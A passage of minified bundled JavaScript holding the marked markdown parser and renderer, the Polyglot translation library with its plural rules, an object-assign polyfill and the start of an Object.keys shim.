e.replace(t?/&/g:/&(?!#?\w+;)/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/'/g,"&#39;")}function l(e){return e.replace(/&(#(?:\d+)|(?:#x[0-9A-Fa-f]+)|(?:\w+));?/gi,(function(e,t){return"colon"===(t=t.toLowerCase())?":":"#"===t.charAt(0)?"x"===t.charAt(1)?String.fromCharCode(parseInt(t.substring(2),16)):String.fromCharCode(+t.substring(1)):""}))}function c(e,t){return e=e.source||e,t=t||"",{replace:function(t,n){return n=(n=n.source||n).replace(/(^|[^\[])\^/g,"$1"),e=e.replace(t,n),this},getRegex:function(){return new RegExp(e,t)}}}function u(e,t){return v[" "+e]||(/^[^:]+:\/*[^/]*$/.test(e)?v[" "+e]=e+"/":v[" "+e]=e.replace(/[^/]*$/,"")),e=v[" "+e],"//"===t.slice(0,2)?e.replace(/:[\s\S]*/,":")+t:"/"===t.charAt(0)?e.replace(/(:\/*[^/]*)[\s\S]*/,"$1")+t:e+t}function p(){}function d(e){for(var t,n,r=1;r<arguments.length;r++)for(n in t=arguments[r])Object.prototype.hasOwnProperty.call(t,n)&&(e[n]=t[n]);return e}function g(e,t){var n=e.replace(/([^\\])\|/g,"$1 |").split(/ +\| */),r=0;if(n.length>t)n.splice(t);else for(;n.length<t;)n.push("");for(;r<n.length;r++)n[r]=n[r].replace(/\\\|/g,"|");return n}function h(e,t,r){if(null==e)throw new Error("marked(): input parameter is undefined or null");if("string"!=typeof e)throw new Error("marked(): input parameter is of type "+Object.prototype.toString.call(e)+", string expected");if(r||"function"==typeof t){r||(r=t,t=null);var a,o,l=(t=d({},h.defaults,t||{})).highlight,c=0;try{a=n.lex(e,t)}catch(e){return r(e)}o=a.length;var u=function(e){if(e)return t.highlight=l,r(e);var n;try{n=i.parse(a,t)}catch(t){e=t}return t.highlight=l,e?r(e):r(null,n)};if(!l||l.length<3)return u();if(delete t.highlight,!o)return u();for(;c<a.length;c++)!function(e){"code"!==e.type?--o||u():l(e.text,e.lang,(function(t,n){return t?u(t):null==n||n===e.text?--o||u():(e.text=n,e.escaped=!0,void(--o||u()))}))}(a[c])}else try{return t&&(t=d({},h.defaults,t)),i.parse(n.lex(e,t),t)}catch(e){if(e.message+="\nPlease report this to https://github.com/markedjs/marked.",(t||h.defaults).silent)return"<p>An error occurred:</p><pre>"+s(e.message+"",!0)+"</pre>";throw e}}var f={newline:/^\n+/,code:/^( {4}[^\n]+\n*)+/,fences:p,hr:/^ {0,3}((?:- *){3,}|(?:_ *){3,}|(?:\* *){3,})(?:\n+|$)/,heading:/^ *(#{1,6}) *([^\n]+?) *(?:#+ *)?(?:\n+|$)/,nptable:p,blockquote:/^( {0,3}> ?(paragraph|[^\n]*)(?:\n|$))+/,list:/^( *)(bull) [\s\S]+?(?:hr|def|\n{2,}(?! )(?!\1bull )\n*|\s*$)/,html:"^ {0,3}(?:<(script|pre|style)[\\s>][\\s\\S]*?(?:</\\1>[^\\n]*\\n+|$)|comment[^\\n]*(\\n+|$)|<\\?[\\s\\S]*?\\?>\\n*|<![A-Z][\\s\\S]*?>\\n*|<!\\[CDATA\\[[\\s\\S]*?\\]\\]>\\n*|</?(tag)(?: +|\\n|/?>)[\\s\\S]*?(?:\\n{2,}|$)|<(?!script|pre|style)([a-z][\\w-]*)(?:attribute)*? */?>(?=\\h*\\n)[\\s\\S]*?(?:\\n{2,}|$)|</(?!script|pre|style)[a-z][\\w-]*\\s*>(?=\\h*\\n)[\\s\\S]*?(?:\\n{2,}|$))",def:/^ {0,3}\[(label)\]: *\n? *<?([^\s>]+)>?(?:(?: +\n? *| *\n *)(title))? *(?:\n+|$)/,table:p,lheading:/^([^\n]+)\n *(=|-){2,} *(?:\n+|$)/,paragraph:/^([^\n]+(?:\n(?!hr|heading|lheading| {0,3}>|<\/?(?:tag)(?: +|\n|\/?>)|<(?:script|pre|style|!--))[^\n]+)*)/,text:/^[^\n]+/,_label:/(?!\s*\])(?:\\[\[\]]|[^\[\]])+/,_title:/(?:"(?:\\"?|[^"\\])*"|'[^'\n]*(?:\n[^'\n]+)*\n?'|\([^()]*\))/};f.def=c(f.def).replace("label",f._label).replace("title",f._title).getRegex(),f.bullet=/(?:[*+-]|\d+\.)/,f.item=/^( *)(bull) [^\n]*(?:\n(?!\1bull )[^\n]*)*/,f.item=c(f.item,"gm").replace(/bull/g,f.bullet).getRegex(),f.list=c(f.list).replace(/bull/g,f.bullet).replace("hr","\\n+(?=\\1?(?:(?:- *){3,}|(?:_ *){3,}|(?:\\* *){3,})(?:\\n+|$))").replace("def","\\n+(?="+f.def.source+")").getRegex(),f._tag="address|article|aside|base|basefont|blockquote|body|caption|center|col|colgroup|dd|details|dialog|dir|div|dl|dt|fieldset|figcaption|figure|footer|form|frame|frameset|h[1-6]|head|header|hr|html|iframe|legend|li|link|main|menu|menuitem|meta|nav|noframes|ol|optgroup|option|p|param|section|source|summary|table|tbody|td|tfoot|th|thead|title|tr|track|ul",f._comment=/<!--(?!-?>)[\s\S]*?-->/,f.html=c(f.html,"i").replace("comment",f._comment).replace("tag",f._tag).replace("attribute",/ +[a-zA-Z:_][\w.:-]*(?: *= *"[^"\n]*"| *= *'[^'\n]*'| *= *[^\s"'=<>`]+)?/).getRegex(),f.paragraph=c(f.paragraph).replace("hr",f.hr).replace("heading",f.heading).replace("lheading",f.lheading).replace("tag",f._tag).getRegex(),f.blockquote=c(f.blockquote).replace("paragraph",f.paragraph).getRegex(),f.normal=d({},f),f.gfm=d({},f.normal,{fences:/^ *(`{3,}|~{3,})[ \.]*(\S+)? *\n([\s\S]*?)\n? *\1 *(?:\n+|$)/,paragraph:/^/,heading:/^ *(#{1,6}) +([^\n]+?) *#* *(?:\n+|$)/}),f.gfm.paragraph=c(f.paragraph).replace("(?!","(?!"+f.gfm.fences.source.replace("\\1","\\2")+"|"+f.list.source.replace("\\1","\\3")+"|").getRegex(),f.tables=d({},f.gfm,{nptable:/^ *([^|\n ].*\|.*)\n *([-:]+ *\|[-| :]*)(?:\n((?:.*[^>\n ].*(?:\n|$))*)\n*|$)/,table:/^ *\|(.+)\n *\|?( *[-:]+[-| :]*)(?:\n((?: *[^>\n ].*(?:\n|$))*)\n*|$)/}),f.pedantic=d({},f.normal,{html:c("^ *(?:comment *(?:\\n|\\s*$)|<(tag)[\\s\\S]+?</\\1> *(?:\\n{2,}|\\s*$)|<tag(?:\"[^\"]*\"|'[^']*'|\\s[^'\"/>\\s]*)*?/?> *(?:\\n{2,}|\\s*$))").replace("comment",f._comment).replace(/tag/g,"(?!(?:a|em|strong|small|s|cite|q|dfn|abbr|data|time|code|var|samp|kbd|sub|sup|i|b|u|mark|ruby|rt|rp|bdi|bdo|span|br|wbr|ins|del|img)\\b)\\w+(?!:|[^\\w\\s@]*@)\\b").getRegex(),def:/^ *\[([^\]]+)\]: *<?([^\s>]+)>?(?: +(["(][^\n]+[")]))? *(?:\n+|$)/}),n.rules=f,n.lex=function(e,t){return new n(t).lex(e)},n.prototype.lex=function(e){return e=e.replace(/\r\n|\r/g,"\n").replace(/\t/g,"    ").replace(/\u00a0/g," ").replace(/\u2424/g,"\n"),this.token(e,!0)},n.prototype.token=function(e,t){e=e.replace(/^ +$/gm,"");for(var n,r,a,o,i,s,l,c,u,p,d,h,m;e;)if((a=this.rules.newline.exec(e))&&(e=e.substring(a[0].length),a[0].length>1&&this.tokens.push({type:"space"})),a=this.rules.code.exec(e))e=e.substring(a[0].length),a=a[0].replace(/^ {4}/gm,""),this.tokens.push({type:"code",text:this.options.pedantic?a:a.replace(/\n+$/,"")});else if(a=this.rules.fences.exec(e))e=e.substring(a[0].length),this.tokens.push({type:"code",lang:a[2],text:a[3]||""});else if(a=this.rules.heading.exec(e))e=e.substring(a[0].length),this.tokens.push({type:"heading",depth:a[1].length,text:a[2]});else if(t&&(a=this.rules.nptable.exec(e))&&(s={type:"table",header:g(a[1].replace(/^ *| *\| *$/g,"")),align:a[2].replace(/^ *|\| *$/g,"").split(/ *\| */),cells:a[3]?a[3].replace(/\n$/,"").split("\n"):[]}).header.length===s.align.length){for(e=e.substring(a[0].length),c=0;c<s.align.length;c++)/^ *-+: *$/.test(s.align[c])?s.align[c]="right":/^ *:-+: *$/.test(s.align[c])?s.align[c]="center":/^ *:-+ *$/.test(s.align[c])?s.align[c]="left":s.align[c]=null;for(c=0;c<s.cells.length;c++)s.cells[c]=g(s.cells[c],s.header.length);this.tokens.push(s)}else if(a=this.rules.hr.exec(e))e=e.substring(a[0].length),this.tokens.push({type:"hr"});else if(a=this.rules.blockquote.exec(e))e=e.substring(a[0].length),this.tokens.push({type:"blockquote_start"}),a=a[0].replace(/^ *> ?/gm,""),this.token(a,t),this.tokens.push({type:"blockquote_end"});else if(a=this.rules.list.exec(e)){for(e=e.substring(a[0].length),d=(o=a[2]).length>1,this.tokens.push({type:"list_start",ordered:d,start:d?+o:""}),n=!1,p=(a=a[0].match(this.rules.item)).length,c=0;c<p;c++)l=(s=a[c]).length,~(s=s.replace(/^ *([*+-]|\d+\.) +/,"")).indexOf("\n ")&&(l-=s.length,s=this.options.pedantic?s.replace(/^ {1,4}/gm,""):s.replace(new RegExp("^ {1,"+l+"}","gm"),"")),this.options.smartLists&&c!==p-1&&(o===(i=f.bullet.exec(a[c+1])[0])||o.length>1&&i.length>1||(e=a.slice(c+1).join("\n")+e,c=p-1)),r=n||/\n\n(?!\s*$)/.test(s),c!==p-1&&(n="\n"===s.charAt(s.length-1),r||(r=n)),m=void 0,(h=/^\[[ xX]\] /.test(s))&&(m=" "!==s[1],s=s.replace(/^\[[ xX]\] +/,"")),this.tokens.push({type:r?"loose_item_start":"list_item_start",task:h,checked:m}),this.token(s,!1),this.tokens.push({type:"list_item_end"});this.tokens.push({type:"list_end"})}else if(a=this.rules.html.exec(e))e=e.substring(a[0].length),this.tokens.push({type:this.options.sanitize?"paragraph":"html",pre:!this.options.sanitizer&&("pre"===a[1]||"script"===a[1]||"style"===a[1]),text:a[0]});else if(t&&(a=this.rules.def.exec(e)))e=e.substring(a[0].length),a[3]&&(a[3]=a[3].substring(1,a[3].length-1)),u=a[1].toLowerCase().replace(/\s+/g," "),this.tokens.links[u]||(this.tokens.links[u]={href:a[2],title:a[3]});else if(t&&(a=this.rules.table.exec(e))&&(s={type:"table",header:g(a[1].replace(/^ *| *\| *$/g,"")),align:a[2].replace(/^ *|\| *$/g,"").split(/ *\| */),cells:a[3]?a[3].replace(/(?: *\| *)?\n$/,"").split("\n"):[]}).header.length===s.align.length){for(e=e.substring(a[0].length),c=0;c<s.align.length;c++)/^ *-+: *$/.test(s.align[c])?s.align[c]="right":/^ *:-+: *$/.test(s.align[c])?s.align[c]="center":/^ *:-+ *$/.test(s.align[c])?s.align[c]="left":s.align[c]=null;for(c=0;c<s.cells.length;c++)s.cells[c]=g(s.cells[c].replace(/^ *\| *| *\| *$/g,""),s.header.length);this.tokens.push(s)}else if(a=this.rules.lheading.exec(e))e=e.substring(a[0].length),this.tokens.push({type:"heading",depth:"="===a[2]?1:2,text:a[1]});else if(t&&(a=this.rules.paragraph.exec(e)))e=e.substring(a[0].length),this.tokens.push({type:"paragraph",text:"\n"===a[1].charAt(a[1].length-1)?a[1].slice(0,-1):a[1]});else if(a=this.rules.text.exec(e))e=e.substring(a[0].length),this.tokens.push({type:"text",text:a[0]});else if(e)throw new Error("Infinite loop on byte: "+e.charCodeAt(0));return this.tokens};var m={escape:/^\\([!"#$%&'()*+,\-./:;<=>?@\[\]\\^_`{|}~])/,autolink:/^<(scheme:[^\s\x00-\x1f<>]*|email)>/,url:p,tag:"^comment|^</[a-zA-Z][\\w:-]*\\s*>|^<[a-zA-Z][\\w-]*(?:attribute)*?\\s*/?>|^<\\?[\\s\\S]*?\\?>|^<![a-zA-Z]+\\s[\\s\\S]*?>|^<!\\[CDATA\\[[\\s\\S]*?\\]\\]>",link:/^!?\[(label)\]\(href(?:\s+(title))?\s*\)/,reflink:/^!?\[(label)\]\[(?!\s*\])((?:\\[\[\]]?|[^\[\]\\])+)\]/,nolink:/^!?\[(?!\s*\])((?:\[[^\[\]]*\]|\\[\[\]]|[^\[\]])*)\](?:\[\])?/,strong:/^__([^\s][\s\S]*?[^\s])__(?!_)|^\*\*([^\s][\s\S]*?[^\s])\*\*(?!\*)|^__([^\s])__(?!_)|^\*\*([^\s])\*\*(?!\*)/,em:/^_([^\s][\s\S]*?[^\s_])_(?!_)|^_([^\s_][\s\S]*?[^\s])_(?!_)|^\*([^\s][\s\S]*?[^\s*])\*(?!\*)|^\*([^\s*][\s\S]*?[^\s])\*(?!\*)|^_([^\s_])_(?!_)|^\*([^\s*])\*(?!\*)/,code:/^(`+)\s*([\s\S]*?[^`]?)\s*\1(?!`)/,br:/^ {2,}\n(?!\s*$)/,del:p,text:/^[\s\S]+?(?=[\\<!\[`*]|\b_| {2,}\n|$)/,_escapes:/\\([!"#$%&'()*+,\-./:;<=>?@\[\]\\^_`{|}~])/g,_scheme:/[a-zA-Z][a-zA-Z0-9+.-]{1,31}/,_email:/[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+(@)[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)+(?![-_])/};m.autolink=c(m.autolink).replace("scheme",m._scheme).replace("email",m._email).getRegex(),m._attribute=/\s+[a-zA-Z:_][\w.:-]*(?:\s*=\s*"[^"]*"|\s*=\s*'[^']*'|\s*=\s*[^\s"'=<>`]+)?/,m.tag=c(m.tag).replace("comment",f._comment).replace("attribute",m._attribute).getRegex(),m._label=/(?:\[[^\[\]]*\]|\\[\[\]]?|`[^`]*`|[^\[\]\\])*?/,m._href=/\s*(<(?:\\[<>]?|[^\s<>\\])*>|(?:\\[()]?|\([^\s\x00-\x1f()\\]*\)|[^\s\x00-\x1f()\\])*?)/,m._title=/"(?:\\"?|[^"\\])*"|'(?:\\'?|[^'\\])*'|\((?:\\\)?|[^)\\])*\)/,m.link=c(m.link).replace("label",m._label).replace("href",m._href).replace("title",m._title).getRegex(),m.reflink=c(m.reflink).replace("label",m._label).getRegex(),m.normal=d({},m),m.pedantic=d({},m.normal,{strong:/^__(?=\S)([\s\S]*?\S)__(?!_)|^\*\*(?=\S)([\s\S]*?\S)\*\*(?!\*)/,em:/^_(?=\S)([\s\S]*?\S)_(?!_)|^\*(?=\S)([\s\S]*?\S)\*(?!\*)/,link:c(/^!?\[(label)\]\((.*?)\)/).replace("label",m._label).getRegex(),reflink:c(/^!?\[(label)\]\s*\[([^\]]*)\]/).replace("label",m._label).getRegex()}),m.gfm=d({},m.normal,{escape:c(m.escape).replace("])","~|])").getRegex(),url:c(/^((?:ftp|https?):\/\/|www\.)(?:[a-zA-Z0-9\-]+\.?)+[^\s<]*|^email/).replace("email",m._email).getRegex(),_backpedal:/(?:[^?!.,:;*_~()&]+|\([^)]*\)|&(?![a-zA-Z0-9]+;$)|[?!.,:;*_~)]+(?!$))+/,del:/^~~(?=\S)([\s\S]*?\S)~~/,text:c(m.text).replace("]|","~]|").replace("|","|https?://|ftp://|www\\.|[a-zA-Z0-9.!#$%&'*+/=?^_`{\\|}~-]+@|").getRegex()}),m.breaks=d({},m.gfm,{br:c(m.br).replace("{2,}","*").getRegex(),text:c(m.gfm.text).replace("{2,}","*").getRegex()}),r.rules=m,r.output=function(e,t,n){return new r(t,n).output(e)},r.prototype.output=function(e){for(var t,n,a,o,i,l="";e;)if(i=this.rules.escape.exec(e))e=e.substring(i[0].length),l+=i[1];else if(i=this.rules.autolink.exec(e))e=e.substring(i[0].length),a="@"===i[2]?"mailto:"+(n=s(this.mangle(i[1]))):n=s(i[1]),l+=this.renderer.link(a,null,n);else if(this.inLink||!(i=this.rules.url.exec(e))){if(i=this.rules.tag.exec(e))!this.inLink&&/^<a /i.test(i[0])?this.inLink=!0:this.inLink&&/^<\/a>/i.test(i[0])&&(this.inLink=!1),e=e.substring(i[0].length),l+=this.options.sanitize?this.options.sanitizer?this.options.sanitizer(i[0]):s(i[0]):i[0];else if(i=this.rules.link.exec(e))e=e.substring(i[0].length),this.inLink=!0,a=i[2],this.options.pedantic?(t=/^([^'"]*[^\s])\s+(['"])(.*)\2/.exec(a))?(a=t[1],o=t[3]):o="":o=i[3]?i[3].slice(1,-1):"",a=a.trim().replace(/^<([\s\S]*)>$/,"$1"),l+=this.outputLink(i,{href:r.escapes(a),title:r.escapes(o)}),this.inLink=!1;else if((i=this.rules.reflink.exec(e))||(i=this.rules.nolink.exec(e))){if(e=e.substring(i[0].length),t=(i[2]||i[1]).replace(/\s+/g," "),!(t=this.links[t.toLowerCase()])||!t.href){l+=i[0].charAt(0),e=i[0].substring(1)+e;continue}this.inLink=!0,l+=this.outputLink(i,t),this.inLink=!1}else if(i=this.rules.strong.exec(e))e=e.substring(i[0].length),l+=this.renderer.strong(this.output(i[4]||i[3]||i[2]||i[1]));else if(i=this.rules.em.exec(e))e=e.substring(i[0].length),l+=this.renderer.em(this.output(i[6]||i[5]||i[4]||i[3]||i[2]||i[1]));else if(i=this.rules.code.exec(e))e=e.substring(i[0].length),l+=this.renderer.codespan(s(i[2].trim(),!0));else if(i=this.rules.br.exec(e))e=e.substring(i[0].length),l+=this.renderer.br();else if(i=this.rules.del.exec(e))e=e.substring(i[0].length),l+=this.renderer.del(this.output(i[1]));else if(i=this.rules.text.exec(e))e=e.substring(i[0].length),l+=this.renderer.text(s(this.smartypants(i[0])));else if(e)throw new Error("Infinite loop on byte: "+e.charCodeAt(0))}else i[0]=this.rules._backpedal.exec(i[0])[0],e=e.substring(i[0].length),"@"===i[2]?a="mailto:"+(n=s(i[0])):(n=s(i[0]),a="www."===i[1]?"http://"+n:n),l+=this.renderer.link(a,null,n);return l},r.escapes=function(e){return e?e.replace(r.rules._escapes,"$1"):e},r.prototype.outputLink=function(e,t){var n=t.href,r=t.title?s(t.title):null;return"!"!==e[0].charAt(0)?this.renderer.link(n,r,this.output(e[1])):this.renderer.image(n,r,s(e[1]))},r.prototype.smartypants=function(e){return this.options.smartypants?e.replace(/---/g,"—").replace(/--/g,"–").replace(/(^|[-\u2014/(\[{"\s])'/g,"$1‘").replace(/'/g,"’").replace(/(^|[-\u2014/(\[{\u2018\s])"/g,"$1“").replace(/"/g,"”").replace(/\.{3}/g,"…"):e},r.prototype.mangle=function(e){if(!this.options.mangle)return e;for(var t,n="",r=e.length,a=0;a<r;a++)t=e.charCodeAt(a),Math.random()>.5&&(t="x"+t.toString(16)),n+="&#"+t+";";return n},a.prototype.code=function(e,t,n){if(this.options.highlight){var r=this.options.highlight(e,t);null!=r&&r!==e&&(n=!0,e=r)}return t?'<pre><code class="'+this.options.langPrefix+s(t,!0)+'">'+(n?e:s(e,!0))+"</code></pre>\n":"<pre><code>"+(n?e:s(e,!0))+"</code></pre>"},a.prototype.blockquote=function(e){return"<blockquote>\n"+e+"</blockquote>\n"},a.prototype.html=function(e){return e},a.prototype.heading=function(e,t,n){return this.options.headerIds?"<h"+t+' id="'+this.options.headerPrefix+n.toLowerCase().replace(/[^\w]+/g,"-")+'">'+e+"</h"+t+">\n":"<h"+t+">"+e+"</h"+t+">\n"},a.prototype.hr=function(){return this.options.xhtml?"<hr/>\n":"<hr>\n"},a.prototype.list=function(e,t,n){var r=t?"ol":"ul";return"<"+r+(t&&1!==n?' start="'+n+'"':"")+">\n"+e+"</"+r+">\n"},a.prototype.listitem=function(e){return"<li>"+e+"</li>\n"},a.prototype.checkbox=function(e){return"<input "+(e?'checked="" ':"")+'disabled="" type="checkbox"'+(this.options.xhtml?" /":"")+"> "},a.prototype.paragraph=function(e){return"<p>"+e+"</p>\n"},a.prototype.table=function(e,t){return t&&(t="<tbody>"+t+"</tbody>"),"<table>\n<thead>\n"+e+"</thead>\n"+t+"</table>\n"},a.prototype.tablerow=function(e){return"<tr>\n"+e+"</tr>\n"},a.prototype.tablecell=function(e,t){var n=t.header?"th":"td";return(t.align?"<"+n+' align="'+t.align+'">':"<"+n+">")+e+"</"+n+">\n"},a.prototype.strong=function(e){return"<strong>"+e+"</strong>"},a.prototype.em=function(e){return"<em>"+e+"</em>"},a.prototype.codespan=function(e){return"<code>"+e+"</code>"},a.prototype.br=function(){return this.options.xhtml?"<br/>":"<br>"},a.prototype.del=function(e){return"<del>"+e+"</del>"},a.prototype.link=function(e,t,n){if(this.options.sanitize){try{var r=decodeURIComponent(l(e)).replace(/[^\w:]/g,"").toLowerCase()}catch(e){return n}if(0===r.indexOf("javascript:")||0===r.indexOf("vbscript:")||0===r.indexOf("data:"))return n}this.options.baseUrl&&!b.test(e)&&(e=u(this.options.baseUrl,e));try{e=encodeURI(e).replace(/%25/g,"%")}catch(e){return n}var a='<a href="'+s(e)+'"';return t&&(a+=' title="'+t+'"'),a+">"+n+"</a>"},a.prototype.image=function(e,t,n){this.options.baseUrl&&!b.test(e)&&(e=u(this.options.baseUrl,e));var r='<img src="'+e+'" alt="'+n+'"';return t&&(r+=' title="'+t+'"'),r+(this.options.xhtml?"/>":">")},a.prototype.text=function(e){return e},o.prototype.strong=o.prototype.em=o.prototype.codespan=o.prototype.del=o.prototype.text=function(e){return e},o.prototype.link=o.prototype.image=function(e,t,n){return""+n},o.prototype.br=function(){return""},i.parse=function(e,t){return new i(t).parse(e)},i.prototype.parse=function(e){this.inline=new r(e.links,this.options),this.inlineText=new r(e.links,d({},this.options,{renderer:new o})),this.tokens=e.reverse();for(var t="";this.next();)t+=this.tok();return t},i.prototype.next=function(){return this.token=this.tokens.pop()},i.prototype.peek=function(){return this.tokens[this.tokens.length-1]||0},i.prototype.parseText=function(){for(var e=this.token.text;"text"===this.peek().type;)e+="\n"+this.next().text;return this.inline.output(e)},i.prototype.tok=function(){switch(this.token.type){case"space":return"";case"hr":return this.renderer.hr();case"heading":return this.renderer.heading(this.inline.output(this.token.text),this.token.depth,l(this.inlineText.output(this.token.text)));case"code":return this.renderer.code(this.token.text,this.token.lang,this.token.escaped);case"table":var e,t,n,r,a="",o="";for(n="",e=0;e<this.token.header.length;e++)n+=this.renderer.tablecell(this.inline.output(this.token.header[e]),{header:!0,align:this.token.align[e]});for(a+=this.renderer.tablerow(n),e=0;e<this.token.cells.length;e++){for(t=this.token.cells[e],n="",r=0;r<t.length;r++)n+=this.renderer.tablecell(this.inline.output(t[r]),{header:!1,align:this.token.align[r]});o+=this.renderer.tablerow(n)}return this.renderer.table(a,o);case"blockquote_start":for(o="";"blockquote_end"!==this.next().type;)o+=this.tok();return this.renderer.blockquote(o);case"list_start":o="";for(var i=this.token.ordered,s=this.token.start;"list_end"!==this.next().type;)o+=this.tok();return this.renderer.list(o,i,s);case"list_item_start":for(o="",this.token.task&&(o+=this.renderer.checkbox(this.token.checked));"list_item_end"!==this.next().type;)o+="text"===this.token.type?this.parseText():this.tok();return this.renderer.listitem(o);case"loose_item_start":for(o="";"list_item_end"!==this.next().type;)o+=this.tok();return this.renderer.listitem(o);case"html":return this.renderer.html(this.token.text);case"paragraph":return this.renderer.paragraph(this.inline.output(this.token.text));case"text":return this.renderer.paragraph(this.parseText())}};var v={},b=/^$|^[a-z][a-z0-9+.-]*:|^[?#]/i;p.exec=p,h.options=h.setOptions=function(e){return d(h.defaults,e),h},h.getDefaults=function(){return{baseUrl:null,breaks:!1,gfm:!0,headerIds:!0,headerPrefix:"",highlight:null,langPrefix:"language-",mangle:!0,pedantic:!1,renderer:new a,sanitize:!1,sanitizer:null,silent:!1,smartLists:!1,smartypants:!1,tables:!0,xhtml:!1}},h.defaults=h.getDefaults(),h.Parser=i,h.parser=i.parse,h.Renderer=a,h.TextRenderer=o,h.Lexer=n,h.lexer=n.lex,h.InlineLexer=r,h.inlineLexer=r.output,h.parse=h,e.exports=h}(this||"undefined"!=typeof window&&window)}).call(t,n(14))},function(e,t,n){"use strict";function r(e,t){var n=function(e){var t={};return l(e,(function(e,n){l(e,(function(e){t[e]=n}))})),t}(e.pluralTypeToLanguages);return n[t]||n[h.call(t,/-/,1)[0]]||n.en}function a(e,t,n){return e.pluralTypes[r(e,t)](n)}function o(e){return e.replace(/[.*+?^${}()|[\]\\]/g,"\\$&")}function i(e,t,n,r,o){if("string"!=typeof e)throw new TypeError("Polyglot.transformPhrase expects argument #1 to be string");if(null==t)return e;var i=e,s=r||b,l=o||v,c="number"==typeof t?{smart_count:t}:t;if(null!=c.smart_count&&i){var d=h.call(i,f);i=p(d[a(l,n||"en",c.smart_count)]||d[0])}return g.call(i,s,(function(e,t){return u(c,t)&&null!=c[t]?c[t]:e}))}function s(e){var t=e||{};this.phrases={},this.extend(t.phrases||{}),this.currentLocale=t.locale||"en";var n=t.allowMissing?i:null;this.onMissingKey="function"==typeof t.onMissingKey?t.onMissingKey:n,this.warn=t.warn||d,this.tokenRegex=function(e){var t=e&&e.prefix||"%{",n=e&&e.suffix||"}";if(t===f||n===f)throw new RangeError('"'+f+'" token is reserved for pluralization');return new RegExp(o(t)+"(.*?)"+o(n),"g")}(t.interpolation),this.pluralRules=t.pluralRules||v}var l=n(31),c=n(50),u=n(34),p=n(43),d=function(e){c(!1,e)},g=String.prototype.replace,h=String.prototype.split,f="||||",m=function(e){var t=e%100,n=t%10;return 11!==t&&1===n?0:2<=n&&n<=4&&!(t>=12&&t<=14)?1:2},v={pluralTypes:{arabic:function(e){if(e<3)return e;var t=e%100;return t>=3&&t<=10?3:t>=11?4:5},bosnian_serbian:m,chinese:function(){return 0},croatian:m,french:function(e){return e>1?1:0},german:function(e){return 1!==e?1:0},russian:m,lithuanian:function(e){return e%10==1&&e%100!=11?0:e%10>=2&&e%10<=9&&(e%100<11||e%100>19)?1:2},czech:function(e){return 1===e?0:e>=2&&e<=4?1:2},polish:function(e){if(1===e)return 0;var t=e%10;return 2<=t&&t<=4&&(e%100<10||e%100>=20)?1:2},icelandic:function(e){return e%10!=1||e%100==11?1:0},slovenian:function(e){var t=e%100;return 1===t?0:2===t?1:3===t||4===t?2:3}},pluralTypeToLanguages:{arabic:["ar"],bosnian_serbian:["bs-Latn-BA","bs-Cyrl-BA","srl-RS","sr-RS"],chinese:["id","id-ID","ja","ko","ko-KR","lo","ms","th","th-TH","zh"],croatian:["hr","hr-HR"],german:["fa","da","de","en","es","fi","el","he","hi-IN","hu","hu-HU","it","nl","no","pt","sv","tr"],french:["fr","tl","pt-br"],russian:["ru","ru-RU"],lithuanian:["lt"],czech:["cs","cs-CZ","sk"],polish:["pl"],icelandic:["is"],slovenian:["sl-SL"]}},b=/%\{(.*?)\}/g;s.prototype.locale=function(e){return e&&(this.currentLocale=e),this.currentLocale},s.prototype.extend=function(e,t){l(e,(function(e,n){var r=t?t+"."+n:n;"object"==typeof e?this.extend(e,r):this.phrases[r]=e}),this)},s.prototype.unset=function(e,t){"string"==typeof e?delete this.phrases[e]:l(e,(function(e,n){var r=t?t+"."+n:n;"object"==typeof e?this.unset(e,r):delete this.phrases[r]}),this)},s.prototype.clear=function(){this.phrases={}},s.prototype.replace=function(e){this.clear(),this.extend(e)},s.prototype.t=function(e,t){var n,r,a=null==t?{}:t;return"string"==typeof this.phrases[e]?n=this.phrases[e]:"string"==typeof a._?n=a._:this.onMissingKey?r=(0,this.onMissingKey)(e,a,this.currentLocale,this.tokenRegex,this.pluralRules):(this.warn('Missing translation for key: "'+e+'"'),r=e),"string"==typeof n&&(r=i(n,a,this.currentLocale,this.tokenRegex,this.pluralRules)),r},s.prototype.has=function(e){return u(this.phrases,e)},s.transformPhrase=function(e,t,n){return i(e,t,n)},e.exports=s},function(e,t,n){"use strict";function r(e){if(null==e)throw new TypeError("Object.assign cannot be called with null or undefined");return Object(e)}
/*
object-assign
(c) Sindre Sorhus
@license MIT
*/var a=Object.getOwnPropertySymbols,o=Object.prototype.hasOwnProperty,i=Object.prototype.propertyIsEnumerable;e.exports=function(){try{if(!Object.assign)return!1;var e=new String("abc");if(e[5]="de","5"===Object.getOwnPropertyNames(e)[0])return!1;for(var t={},n=0;n<10;n++)t["_"+String.fromCharCode(n)]=n;if("0123456789"!==Object.getOwnPropertyNames(t).map((function(e){return t[e]})).join(""))return!1;var r={};return"abcdefghijklmnopqrst".split("").forEach((function(e){r[e]=e})),"abcdefghijklmnopqrst"===Object.keys(Object.assign({},r)).join("")}catch(e){return!1}}()?Object.assign:function(e,t){for(var n,s,l=r(e),c=1;c<arguments.length;c++){for(var u in n=Object(arguments[c]))o.call(n,u)&&(l[u]=n[u]);if(a){s=a(n);for(var p=0;p<s.length;p++)i.call(n,s[p])&&(l[s[p]]=n[s[p]])}}return l}},function(e,t,n){"use strict";var r;if(!Object.keys){var a=Object.prototype.hasOwnProperty,o=Object.prototype.toString,i=n(10),s=Object.prototype.propertyIsEnumerable,l=!s.call({toString:null},"toString"),c=s.call((function(){}),"prototype"),u=["toString","toLocaleString","valueOf","hasOwnProperty","isPrototypeOf","propertyIsEnumerable","constructor"],p=function(e){var t=e.constructor;return t&&t.prototype===e},d={$applicationCache:!0,$console:!0,$external:!0,$frame:!0,$frameElement:!0,$frames:!0,$innerHeight:!0,$innerWidth:!0,$outerHeight:!0,$outerWidth:!0,$pageXOffset:!0,$pageYOffset:!0,$parent:!0,$scrollLeft:!0,$scrollTop:!0,$scrollX:!0,$scrollY:!0,$self:!0,$webkitIndexedDB:!0,$webkitStorageInfo:!0,$window:!0},g=function(){if("undefined"==typeof window)return!1;for(var e in window)try{if(!d["$"+e]&&a.call(window,e)&&null!==window[e]&&"object"==typeof window[e])try{p(window[e])}catch(e){return!0}}catch(e){return!0}return!1}(),h=function(e){if("undefined"==typeof window||!g)return p(e);try{return p(e)}catch(e){return!1}};r=function(e){var 